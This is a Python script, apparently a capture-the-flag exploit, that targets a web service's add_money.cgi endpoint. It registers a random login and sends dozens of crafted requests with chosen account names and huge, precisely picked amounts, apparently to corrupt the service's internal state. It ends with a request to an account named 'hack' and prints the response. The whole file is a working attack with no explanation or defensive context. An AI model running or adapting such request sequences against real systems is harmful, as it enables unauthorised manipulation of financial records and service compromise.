#!/usr/bin/python3

import requests
import sys
import random


addr = sys.argv[1];

login = str(random.randint(0, 10000000000))

print("Login:", login)

def send_add_money_req(addr, login, account, amount, show=False):
	try:
		resp = requests.get("http://%s/add_money.cgi" % addr, 
			params={"login": login, "account": account, "amount": amount})
	
		success = "Successful" in resp.text
		if success:
			print('.', end="")
			sys.stdout.flush()
		if show:
			print(resp.text)
		return success
	except:
		print("Failed")
		return False

print("Sending requests", end="")

send_add_money_req(addr, login, "bay_spl_1_44", 1507457777156014259);
send_add_money_req(addr, login, "bay_spl_1_11", 1507386899387365478);
send_add_money_req(addr, login, "bay_spl_1_32", 1507386900782823526);
send_add_money_req(addr, login, "bay_spl_1_18", 1507386901097592934);
send_add_money_req(addr, login, "bay_spl_1_12", 1507386900129298534);
send_add_money_req(addr, login, "bay_spl_1_36", 1507386899387365478);
send_add_money_req(addr, login, "bay_spl_1_41", 1507386903170234470);
send_add_money_req(addr, login, "bay_spl_1_31", 1507386900516157542);
send_add_money_req(addr, login, "bay_spl_1_21", 1507386900745336934);
send_add_money_req(addr, login, "bay_spl_1_24", 1507386900076345446);
send_add_money_req(addr, login, "bay_spl_1_0", 1507386899960805478);
send_add_money_req(addr, login, "bay_spl_1_45", 1507386901402859622);
send_add_money_req(addr, login, "bay_spl_1_2", 1507386900166195302);
send_add_money_req(addr, login, "bay_spl_1_22", 1507386901305014374);
send_add_money_req(addr, login, "bay_spl_1_43", 1507386899958904934);
send_add_money_req(addr, login, "bay_spl_1_15", 1507386900650047590);
send_add_money_req(addr, login, "bay_spl_1_33", 1507386901171124326);
send_add_money_req(addr, login, "bay_spl_1_38", 1507386900059568230);
send_add_money_req(addr, login, "bay_spl_1_5", 1507386901188163686);
send_add_money_req(addr, login, "bay_spl_1_25", 1507386901221849190);
send_add_money_req(addr, login, "bay_spl_1_19", 1507386899302496358);
send_add_money_req(addr, login, "bay_spl_1_28", 1507386899304003686);
send_add_money_req(addr, login, "bay_spl_1_10", 1507386903200184422);
send_add_money_req(addr, login, "bay_spl_1_3", 1507386903170234470);
send_add_money_req(addr, login, "bay_spl_1_17", 1507386900510455910);
send_add_money_req(addr, login, "bay_spl_1_42", 1507386899308984422);
send_add_money_req(addr, login, "bay_spl_1_34", 1507386900064286822);
send_add_money_req(addr, login, "bay_spl_1_16", 1507386903187011686);
send_add_money_req(addr, login, "bay_spl_1_40", 1507386900515895398);
send_add_money_req(addr, login, "bay_spl_1_9", 1507386899309312102);
send_add_money_req(addr, login, "bay_spl_1_27", 1507386901234956390);
send_add_money_req(addr, login, "bay_spl_1_23", 3524999534216853606);
send_add_money_req(addr, login, "bay_spl_1_14", 3524999534011725926);
send_add_money_req(addr, login, "bay_spl_1_13", 3524999535506536550);
send_add_money_req(addr, login, "bay_spl_1_35", 3524999534937159782);
send_add_money_req(addr, login, "bay_spl_1_1", 3524999533361281126);
send_add_money_req(addr, login, "bay_spl_1_26", 3524999532364489983);
send_add_money_req(addr, login, "bay_spl_q_809732", 1);
send_add_money_req(addr, login, "bay_spl_q_1228587", 1);
send_add_money_req(addr, login, "bay_spl_q_1575586", 1);
send_add_money_req(addr, login, "bay_spl_q_330328", 1);
send_add_money_req(addr, login, "bay_spl_q_1267013", 1);
send_add_money_req(addr, login, "bay_spl_q_787388", 1);
send_add_money_req(addr, login, "bay_spl_q_893989", 1);
send_add_money_req(addr, login, "bay_spl_q_726639", 1);
send_add_money_req(addr, login, "bay_spl_q_6244081", 281444908722432);
send_add_money_req(addr, login, "hack", 1, True);

# print("")
# print("")
# print("Try http://%s/add_money.cgi?login=%s&account=aaa&amount=100" % (addr, login))


# send_request = 